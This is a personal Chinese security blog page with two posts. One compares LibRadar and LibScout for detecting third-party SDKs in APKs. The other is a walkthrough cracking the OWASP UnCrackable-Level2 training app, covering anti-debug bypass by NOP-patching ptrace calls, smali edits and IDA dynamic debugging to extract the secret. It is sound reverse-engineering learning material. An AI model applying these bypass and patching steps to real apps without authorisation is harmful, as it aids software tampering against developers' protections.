<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  <title>Se8S0n</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Se8S0n">
<meta property="og:url" content="http://Se8S0n.github.io.git/index.html">
<meta property="og:site_name" content="Se8S0n">
<meta property="og:locale" content="zh-cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Se8S0n">
  
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
  
</head></html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="overlay"></div>
  <div id="header-outer" class="outer">
    <div id="profile_img">
      <img id="circle_img" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1507005566072&amp;di=9f9f92b244fc348a76a81879f8e5dbfb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.58pic.com%2F58pic%2F12%2F36%2F62%2F12c58PICPCj.jpg" />
    </div>
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Se8S0n</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">The more you want, the more you get.</a>
        </h2>
      
    </div>
    <div id="header-menu">
      <nav id="main-nav">
        <ul>
        
          <li><a href="/"><i class="fa fa-home icon-setting"></i></a></li>
        
          <li><a href="/archives"><i class="fa fa-archive icon-setting"></i></a></li>
        
          <li><a href="/about"><i class="fa fa-user icon-setting"></i></a></li>
        
          <li><a href="/friends"><i class="fa fa-users icon-setting"></i></a></li>
        
          <li><a href="http://weibo.com/p/1005055968437225/home?from=page_100505_profile&wvr=6&mod=data&is_hot=1#place"><i class="fa fa-weibo icon-setting"></i></a></li>
        
        
        </ul>
      </nav>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-获取APK中第三方库信息的工具" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/29/获取APK中第三方库信息的工具/" class="article-date">
  <time datetime="2020-01-29T20:04:02.000Z" itemprop="datePublished">2020-01-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/29/获取APK中第三方库信息的工具/">获取APK中第三方库信息的工具</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="获取APK中第三方库信息的工具"><a href="#获取APK中第三方库信息的工具" class="headerlink" title="获取APK中第三方库信息的工具"></a>获取APK中第三方库信息的工具</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近想尝试开发一个Android安全性检测平台，在尝试获取APK第三方SDK的信息的时候出现了一些问题，直接使用androguard是不能获取SDK的信息的，且现在第三方提供的SDK大多都经过了混淆或者重命名处理等保护SDK安全性的方法，就造成了我们很难准确地获取APK中存在哪些SDK。这时候就需要另(yong)辟(xian)蹊(cheng)径(de)，在网上能够收集到的只有16年北大的<a href="https://github.com/pkumza/LibRadar" target="_blank" rel="noopener">LibRadar</a>、reddr开源的<a href="https://github.com/reddr/LibScout" target="_blank" rel="noopener">LibScout</a>和基于LibScout开发的<a href="https://github.com/regNec/apkLibDetect" target="_blank" rel="noopener">apkLibDetect</a>。</p>
<h3 id="工具的分析"><a href="#工具的分析" class="headerlink" title="工具的分析"></a>工具的分析</h3><h4 id="LibRadar"><a href="#LibRadar" class="headerlink" title="LibRadar"></a>LibRadar</h4><p>为了避免手动做很多重复性的信息收集工作，我决定尝试使用多个工具。提取我所需的信息，现在想得到个SDK信息都需要了解机器学习，是我太菜了。下面我大概地讲讲LibRadar这个工具，详情可看<a href="http://sei.pku.edu.cn/~yaoguo/papers/Wang-JOS-17.pdf" target="_blank" rel="noopener">LibRadar的相关论文</a>。</p>
<p>LibRadar使用了多级聚类技术识别第三方库（因为第三方库调用的次数多，再加上第三方库一般不会修改，根据这两个特点判断是否为第三方库），使用机器学习对第三方库的功能进行准确分类（应该是使用了分类算法）。但是这个工具不能实现我想判断这个第三方库安全与否的功能，且因工具年代久远，团队不再对该工具进行维护。不过要是能将这个工具在python3的环境下修改和调试，应该能减少获取第三方SDK的工作量，且避免了在python更新之后不能正常使用的情况。但是我还没有研究过，这只能作为一个可行的方案之一。</p>
<p>搭建环境</p>
<ul>
<li>Ubuntu 18.04</li>
<li>Python 2.7.6</li>
</ul>
<p>下面就先在Ubuntu上搭建好Python2的使用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 准备好编译Python的环境</span><br><span class="line">$ sudo apt-get install zlib1g-dev</span><br><span class="line">$ sudo apt-get install gcc</span><br><span class="line"># 获取Python 2.7.6的安装包</span><br><span class="line">$ wget http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tar.xz</span><br><span class="line">$ tar xvf Python-2.7.6.tar.xz</span><br><span class="line">$ cd Python-2.7.6</span><br><span class="line">$ ./configure</span><br><span class="line"># 编译、安装</span><br><span class="line">$ make &amp; make install</span><br></pre></td></tr></table></figure></p>
<p>接下来就准备好LibRadar的使用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载LiteRadar</span><br><span class="line">$ git clone https://github.com/pkumza/LiteRadar</span><br><span class="line"># 下载SDK特征文件</span><br><span class="line">$ wget https://raw.githubusercontent.com/pkumza/Data_for_LibRadar/master/lite_dataset_10.csv</span><br><span class="line">$ mv lite_dataset_10.csv LiteRadar/LiteRadar/Data</span><br><span class="line"># 获取aaa.apk中的第三方SDK信息</span><br><span class="line">$ python LiteRadar/LiteRadar/literadar.py aaa.apk</span><br></pre></td></tr></table></figure></p>
<p>获取到的结果如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271030/1_hoyghp.png" alt></p>
<p>但是处理multi-dex的APK会出现如下报错：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271047/2_l1icpk.png" alt></p>
<p>但是换了内存2048MB的VPS就能正常解决，而且显示的结果与LibScout比起来感觉更加符合我们的基础需求：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271055/3_melokb.png" alt></p>
<h4 id="LibScout"><a href="#LibScout" class="headerlink" title="LibScout"></a>LibScout</h4><p>因为apkLibDetect是基于LibScout的，所以就不另外分出模块讲解apkLibDetect了。在操作过程中如果遇到了问题，可以参考文章的末尾，有我遇到的问题及其处理方式。</p>
<p>搭建环境</p>
<ul>
<li>Ubuntu 18.04</li>
<li>openjdk 11.0.5</li>
<li>Android Studio</li>
</ul>
<p>这里先提供了自己编译LibScout.jar的方法，如果不想自己编译LibScout.jar文件，可以直接用<code>apt install libscout</code>，详细的介绍后面有。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载LibScout</span><br><span class="line">$ git clone https://github.com/reddr/LibScout.git</span><br><span class="line"># 下载SDK检测的样本文件</span><br><span class="line">$ git clone https://github.com/reddr/LibScout-Profiles.git</span><br><span class="line">$ cd LibScout</span><br><span class="line"># 生成LibScout.jar</span><br><span class="line">$ ./gradlew build</span><br></pre></td></tr></table></figure></p>
<p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271068/4_scgq22.png" alt></p>
<p>除了我们自己编译之外，我们还可以使用<code>apt</code>直接安装libscout的方式使用LibScout。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ apt update &amp;&amp; apt upgrade</span><br><span class="line">$ apt install libscout</span><br></pre></td></tr></table></figure></p>
<p>在下好Android Studio环境下找到<code>Android/Sdk/platforms/android-28</code>目录下的<code>android.jar</code>文件，并在LibScout目录下新建sdk文件夹，将<code>android.jar</code>文件放到该目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir sdk</span><br><span class="line">$ mv [path of android.jar]/android.jar sdk/android.jar</span><br><span class="line">$ cd ..</span><br><span class="line"># 使用自己编译的LibScout.jar获取第三方SDK信息</span><br><span class="line">$ java -jar ./LibScout/build/libs/LibScout.jar -o match -p ./LibScout-Profiles -c ./LibScout/config/LibScout.toml -a ./LibScout/sdk/android-28.jar aaa.apk</span><br><span class="line"># 使用apt安装的libscout获取第三方SDK信息并输出到LibScout/result目录下</span><br><span class="line">$ libscout -o match -p ./LibScout-Profiles -c ./LibScout/config/LibScout.toml -j ./LibScout/result -a ./LibScout/sdk/android-28.jar test22.apk</span><br></pre></td></tr></table></figure></p>
<p>执行命令获取SDK信息，并直接输出到屏幕。-o参数指定相关操作，match是获取该APK中存在的SDK信息，-p参数指向我们之前下载的第三方SDK检测的样本文件，-a参数指向我们之前获取的<code>android.jar</code>，这个参数能将SDK与APK区分开来。如果有其它需求，比如将检测结果输入为json文件，可以添加一个-j参数指定输出结果存放的目录。</p>
<p>根据应用的包名，进入<code>./LibScout/result/cn/ninegame/gamemanager</code>目录下，会发现有一个json文件，该文件储存了第三方SDK信息。下面是格式化过的json文件：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271072/5_x8k8rj.png" alt></p>
<p>在LibScout平级路径下获取SDK信息出现报错，报错如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03:59:32.160 [main] ERROR de.infsec.tpl.TplCLI - Error: Could not parse config option logging.log4j_config_file : No valid file: ~/LibScout/config/logback.xml</span><br></pre></td></tr></table></figure></p>
<p>上面的报错修改了LibScout.toml中logback.xml的路径为./LibScout/config/logback.xml就不会报错了。</p>
<p>在获取SDK信息的过程中遇到了运行Java代码时堆空间过小的报错：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1580271263/6_e2d7om.png" alt><br>上面的报错同样是可以通过换大内存的VPS或增加虚拟机的内存解决。</p>
<p>其实LibScout也是存在着不足的，但是它有一个优点就是当遇到multi-dex的APK的时候，它会将多个dex文件整合到一起，再进行检测。同时LibScout还能结合工具判断第三方库是否足够安全，当然这个安全与否是基于是否有漏洞爆出和第三方库的版本的。LibScout的不足还有两个，一是是它需要的内存过大，二是LibScout能检测的SDK虽然能包含大部分，但是还是存在一些第三方SDK检测不出来的情况。</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>比较一下LibRadar和LibScout，会感觉如果不考虑获取第三方库的安全性和检测第三方库的工具的可维护性，LibRadar会更加符合我的需求。但是要考虑到第三方库安全与否，与检测结果是否可延展，可延展指的是可以通过检测结果结合现有的漏洞库信息获取更多我们需要的信息，还是使用LibScout更加合适。</p>
<p>如果文章中有表述的不够合适的或者有更好的获取第三方库的方法，希望能够交流一下。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2020/01/29/获取APK中第三方库信息的工具/" data-id="ckrzo1bjb000fdfrte9cf15vb" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-从OWASP-CrackMe学Android逆向-二" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/05/从OWASP-CrackMe学Android逆向-二/" class="article-date">
  <time datetime="2019-11-06T00:42:48.000Z" itemprop="datePublished">2019-11-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/05/从OWASP-CrackMe学Android逆向-二/">从OWASP CrackMe学Android逆向(二)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从<a href="https://www.52pojie.cn/thread-1048786-1-1.html" target="_blank" rel="noopener">OWASP CrackMe学Android逆向(一)</a>感觉用题目来学习会比之前学得内容多很多, 然后这些题目有多种解法, 我也学到很多姿势, 下面就来分析<code>UnCrackable-Level2</code>。这个题目涉及.so动态调试的知识。</p>
<h2 id="UnCrackable-Level2"><a href="#UnCrackable-Level2" class="headerlink" title="UnCrackable-Level2"></a>UnCrackable-Level2</h2><p>同样的, 先将<code>UnCrackable-Level2.apk</code>放到JEB中分析, 一进到MainActivity, 就发现了一个神奇的东西, 这个应用加载了<code>libfoo.so</code>文件。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920916/OWASP/OWASP-2/1.png" alt></p>
<p>能感觉出来这个应用和之前level1不同的是, check输入的关键代码应该是在<code>libfoo.so</code>中, 所以不能使用Xposed去处理这个CrackMe了, 但是root和debug的检测还是Java层调用<code>System.exit(0)</code>退出。所以上次的cracker.js, 重载系统exit函数部分保留。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920917/OWASP/OWASP-2/2.png" alt></p>
<p>将<code>UnCrackable-Level2.apk</code>解压之后在<code>UnCrackable-Level2\lib\arm64-v8a</code>目录下找到<code>ibfoo.so</code>, 把它拖到IDA里面分析一下。查看Export表导出的函数, 发现存在含有关键词CodeCheck的函数。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920917/OWASP/OWASP-2/3.png" alt></p>
<p>按下F5查看其反编译的代码, 发现存在可疑的数据<code>xmmword_EA0</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920917/OWASP/OWASP-2/4.png" alt></p>
<p> 双击<code>xmmword_EA0</code>, 发现了一个传入v7的是一个大数, 使用Hex-View查看其Ascii码, 发现了一句不完整的话<code>Thank for all t</code><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/5.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/6.png" alt></p>
<p> CheckCode中还有v8参数, 虽然现在暂时不知道它有什么用, 还是先将它最后处理的过程写出来, 详情可以看注释, 最后我们知道v8的数据转换为ascii码之后为”eish”, 暂时不知道这个的用处, 所以先放着。根据下面的result获取, 我们也就知道了, 我们最终想要的字符串是存放在v6参数中的。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/7.png" alt></p>
<p> 分析<code>libfoo.so</code>中的其他的函数, 发现应用限制了attach, 还是通过轮询的方法监视应用是否被调试。也就是说, 如果想使用IDA动态调试这个应用的话, 还需要我们绕过这种反调试的机制。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920918/OWASP/OWASP-2/8.png" alt></p>
<p> 事先说明，上面静态分析的过程都是对<code>lib\arm64-v8a</code>文件夹下的<code>libfoo.so</code>文件进行分析的。在分析代码的过程中，存在一些函数调用的过程让我们看起来不是很舒服。实际上这些调用的函数都是JNI函数, 我们可以通过导入jni.h文件(File-&gt;Load File-&gt;Parse C header file…)——jni.h文件一般安装了Android Studio都有, 我的存放在<code>Android Studio\jre\include</code>目录下, 选中v4指针，选中后按一下”y”键，然后将类型声明为<code>JNIEnv*</code>即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572922697/OWASP/OWASP-2/re_8.png" alt></p>
<p> 修改之后效果如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920919/OWASP/OWASP-2/9.png" alt></p>
<p> 那什么时候我们可以使用上面的方法还原函数名呢？在文章<a href="https://wooyun.js.org/drops/%E5%AE%89%E5%8D%93%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E4%B8%83%E7%A7%8D%E6%AD%A6%E5%99%A8%E4%B9%8B%E5%AD%94%E9%9B%80%E7%BF%8E%20%E2%80%93%20Ida%20Pro.html" target="_blank" rel="noopener">安卓动态调试七种武器之孔雀翎 – Ida Pro</a>中有提及, 如果出现一个指针加上一个数字，比如v3+676。然后将这个地址作为一个方法指针进行方法调用，并且第一个参数就是指针自己，比如(v3+676)(v3…)。这实际上就是我们在JNI里经常用到的JNIEnv方法。</p>
<p> 静态分析就分析到这里了。现在, 我们需要开始动手了。</p>
<h3 id="静态分析代码"><a href="#静态分析代码" class="headerlink" title="静态分析代码"></a>静态分析代码</h3><p>因为我手机arm版本为<code>arm64-v8a</code>(使用命令<code>adb shell getprop ro.product.cpu.abi</code>可查看arm版本), 所以前面的分析都是基于<code>lib\armeabi-v7a\libfoo.so</code>。当我将<code>lib\armeabi-v7a\libfoo.so</code>拖到32位的IDA中分析代码的时候找到含有<code>CodeCheck</code>的函数, 发现密钥以明文字符串的形式出现了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920919/OWASP/OWASP-2/10.png" alt></p>
<p> 这时候我们输入”Thanks for all the fish”, 发现我们成功找到密钥。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/11.png" alt></p>
<p>即便如此简单, 我们还是需要学习通过动态调试的方法获取密钥。以防遇到加了密或者其他更难分析的情况，我们无从下手。</p>
<h3 id="IDA动态调试代码"><a href="#IDA动态调试代码" class="headerlink" title="IDA动态调试代码"></a>IDA动态调试代码</h3><h4 id="绕过反调试机制"><a href="#绕过反调试机制" class="headerlink" title="绕过反调试机制"></a>绕过反调试机制</h4><p>通过上面的分析(不包含静态分析<code>arm64-v7a</code>目录的libfoo.so文件的内容), 静态分析到现在也没找到完整的23个字母长度的密钥, 我们要通过IDA调试的方法获得密钥,。尝试动态调试.so文件的时候会发现应用会闪退, 所以我们需要来过反调试机制才能让应用正常运行并且获得密钥。那我们怎么做才能成功绕过反调试机制呢？</p>
<p>根据分析，我们要绕过的反调试机制分别处于Java层和Native层。</p>
<p>我们下面先修改应用的smali源码, 不然我们设置完AndroidManifest.xml文件<code>debuggable=&quot;true&quot;</code>之后, 还要面对下面的弹窗。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/12.png" alt></p>
<p>还记得我们最开始分析的Java层的代码不, 现在我们来回忆一下。发现应用在root环境或可调试的环境下运行之后, 会调用MainActivity类中的a函数。双击该函数, 分析代码逻辑。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/13.png" alt></p>
<p>发现这个函数会在我们做了点击OK的操作之后调用系统的exit函数退出。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/14.png" alt></p>
<p>反编译apk之后, 定位到刚刚的a函数。发现函数最后返回为return-void, 那我们直接把中间的代码删除就ok。接下来就是常规的反编译+重签名的操作, 这里就不赘述了。安装修改之后的应用, Java层的反调试就绕过了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920920/OWASP/OWASP-2/15.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/16.png" alt></p>
<p>下面讲一下稍有难度的绕过Native层的代码, 用IDA反编译libfoo.so。从IDA左侧的Function窗口双击<code>Java_sg_vantagepoint_uncrackable2_MainActivity_init</code>, 发现会调用<code>sub_918</code>方法。双击<code>sub_918</code>函数分析代码。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/17.png" alt></p>
<p>通过代码我们可以知道, <code>sub_918</code>是起反调试作用的关键函数。接下来我们分析一下这个函数是如何实现反调试的，该函数会先fork自身, 产生一个子进程, 父进程在运行的过程中使用了轮询机制, 通过<a href="https://refspecs.linuxbase.org/LSB_5.0.0/LSB-Core-generic/LSB-Core-generic/baselib-ptrace-1.html" target="_blank" rel="noopener">ptrace函数</a>监视自身是否处于被调试的状态。子进程和fock失败的父进程, 会调用waitpid一般情况下, ptrace这种类型的函数是不会被混淆的, 所以我们直接将调用ptrace函数的部分nop掉就好了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/18.png" alt></p>
<p>使用IDA View-A打开<code>sub_918</code>函数, 可以看到有两个<code>BL .ptrace</code>。选中其中的一个<code>.ptrace</code>, 然后打开Hex View-1页面。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/19.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920921/OWASP/OWASP-2/20.png" alt></p>
<p>按下快捷键<code>F2</code>, 输入<code>1F 20 03 D5</code>(NOP), 将原本的<code>9C FF FF 97</code>替换掉, patch结束之后按<code>F2</code>完成修改(两个<code>BL .ptrace</code>都用这种方法修改)。发现网上有部分文章使用指令<code>00 00 00 00</code>和<code>00 00 A0 E1</code>(mov r0,r0)修改, 我按照那种方式修改之后, 发现代码结构被破坏掉了, 应用不能正常运行, 最后直接使用<code>NOP</code>指令才能让应用正常运行, 并绕过反调试的检测。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/21.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/22.png" alt></p>
<p>最后按下图选中下图<code>Apply patches to input file....</code>, 就可以保存我们修改之后的结果。我们只需要patch我们设备使用到的<code>libfoo.so</code>文件, 比如我设备的arm版本是<code>arm64-v8a</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/23.png" alt></p>
<p>这里只针对这个应用的反调试作了介绍, 如果想了解更多反调试和绕过反调试的内容, 可以看看文章<a href="https://bbs.pediy.com/thread-223460.htm" target="_blank" rel="noopener">【SO壳】17种安卓native反调试收集</a>。</p>
<h4 id="IDA动态调试Native代码"><a href="#IDA动态调试Native代码" class="headerlink" title="IDA动态调试Native代码"></a>IDA动态调试Native代码</h4><p>在正式开始之前, 我们需要做点准备工作。 首先打开目录<code>&lt;你IDA安装的目录下&gt;\IDA\dbgsrv</code>, 将该目录下的<code>android_server</code>push进手机里面并添加权限。</p>
<pre><code>$ adb push android_server64 #要按照你自己的使用的设备的内核进行选择, 查看arm版本就知道
$ adb forward tcp:23946 tcp:23946 # 设置本地端口转发
$ adb shell
$ su
$ cd /data/local/tmp
$ chmod +x android_server64
$ ./android_server
</code></pre><p> 经过测试，发现应用不能进行调试。我们先解决AndroidManifest.xml上的反调试，有4种方法：</p>
<ul>
<li>反编译APK, 修改AndroidManifest.xml, 使<code>debuggable=&quot;true&quot;</code></li>
<li>从手机内核中提取出boot.img并修改, 使<code>ro.debuggable=1</code>, 或者可以使用mprop, 但是有版本限制。</li>
<li>在装有Xposed的手机上安装<a href="https://security.tencent.com/index.php/opensource/detail/17" target="_blank" rel="noopener">BDOpener</a>, 重启激活该模块即可。</li>
<li><p>设置全局变量, 使<code>ro.debuggable=1</code>（每次开机重启后失效）</p>
<p>使用上面的方法让应用处于可调试的状态, 用DDMS打开, 效果如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/24.png" alt></p>
</li>
</ul>
<p>先输入命令<code>adb shell dumpsys activity top | findstr ACTIVITY</code>, 通过输出可知应用的包名及当前的Activity, 输入命令<code>adb shell am start -D -n owasp.mstg.uncrackable2/sg.vantagepoint.uncrackable2.MainActivity</code>可让Uncrackable2这个应用处于被调试状态。这时候查看DDMS, 我们可以看到应用的状态改变了。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/25.png" alt></p>
<p> 接下来要用IDA对<code>.so</code>文件进行动态调试, 打开64位的IDA，打开debug选项<code>Debugger-&gt;attach-&gt;Remoute Android debugger</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/26.png" alt></p>
<p> 这时候会出现一个弹窗, 点击<code>Debug option</code>, 勾选上框出来的3项。点击OK之后, 在hostname里面填写127.0.0.1即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/27.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/28.png" alt></p>
<p> 之后会出现手机加载的进程, 我们只需要选中我们想调试的<code>uncrackable2</code>, 就可以进入IDA的调试界面。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/29.png" alt></p>
<p> 之后使用jdb使应用继续运行, 因为上面的DDMS几次重新打开, 所以端口映射部分会不一致。我们在使用jdb调试的时候, 最好还是先打开DDMS, 查看应用真正映射的端口, 否则会出现<code>无法附加到目标 VM</code>的错误, 按照下面的显示结果, 我们需要输入命令<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8605</code>(8700端口被DDMS进程占用, 改为8605端口, 不开DDMS就不用改)。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/30.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/31.png" alt></p>
<p> 双开IDA计算进程动态运行时我们想要定位的函数的地址, 在动态调试的IDA按下<code>F9</code>快捷键让程序正常运行, 这时候我们就能在IDA右侧<code>Module</code>板块搜索到<code>libfoo.so</code>动态加载的地址<code>0x0000007B11291000</code>, 之后我们从分析静态<code>libfoo.so</code>的IDA中获取函数<code>CodeCheck</code>函数的偏移量为<code>0xDAC</code>, 所以最后我们能够计算出我们要跳转到<code>0x0000007B11291DAC</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/32.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/33.png" alt></p>
<p>按下快捷键<code>G</code>, 跳转到我们计算的CodeCheck函数开始的地址(<code>0x0000007B11291DAC</code>), 发现代码不能解析出来, 选中部分代码, 用快捷键<code>C</code>解析代码(一次不行就先按<code>C</code>再按下<code>Force</code>)。然后在地址<code>0x0000007B11291DAC</code>下断点, 在手机应用界面上输入随便输入长度为23的字符串之后点击<code>Verify</code>, 就可以运行到如下位置。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/34.png" alt></p>
<p>在动态调试汇编代码的过程中, 会发现我们很难根据变量名获取其中的值, 只能在调试的过程中看到寄存器中存储的内容, 将静态调试的IDA中的汇编代码和动态调试过程中的IDA的代码进行比对, 我们可以找出一些函数, 比如这里的<code>strncmp</code>的函数的位置, 也可以通过静态分析的IDA找到<code>strncmp</code>函数的位置(<code>0x0000007B11291000+0xE5C=0x0000007B11291E5C</code>), 选中<code>unk_7B11281820</code>, 使用快捷键<code>N</code>可将地址名重命名为<code>.strncmp</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/35.png" alt></p>
<p>IDA右侧有<code>General Registers</code>窗口, 但是这个窗口只会出现地址, 而我们需要获取寄存器中的值, <code>View-&gt;Open subviews-&gt;Hex dump</code>可以查看内存中的数值。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/36.png" alt></p>
<p><code>F8</code>单步调试到<code>BL .strncmp</code>处, 这时候我们就能看到传递的参数寄存器X1和X0存放的地址。鼠标移至X0存放的地址, 右键选中<code>Select All</code>, 复制地址。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/37.png" alt></p>
<p>转到<code>Hex View-3</code>的窗口, 按下快捷键<code>G</code>, 跳转到刚刚我们复制的地址处。可以看到我们刚刚在应用中输入的数值, 想要获取X1的值可以用一样的方法, 最终我们得到要输入的密码为<code>Thanks for all the fish</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/38.png" alt><br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1572920922/OWASP/OWASP-2/39.png" alt></p>
<p>IDA动态调试的过程就到这里结束了, 下面还有一种不patch apk的方法可以实现绕过反调试和各种检测的方法, 使用到了Radare2, 感觉重要的是学习思路而不是工具如何使用这句话, 还是很有道理的。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>实际上最近有很多事情要做, 配置Radare2及其插件上, 我花了很多时间, 现在还有一个小插件没安装好。为了推着自己完成这篇系列文章, 就把UnCrackable2完成的部分先发出来。希望我能尽快完成环境的配置还有之后的文章吧…..</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://Se8S0n.github.io.git/2019/11/05/从OWASP-CrackMe学Android逆向-二/" data-id="ckrzo1bj9000cdfrtimb5d7d6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android逆向/">Android逆向</a></li></ul>

    </footer>
  </div>
  
</article>


  
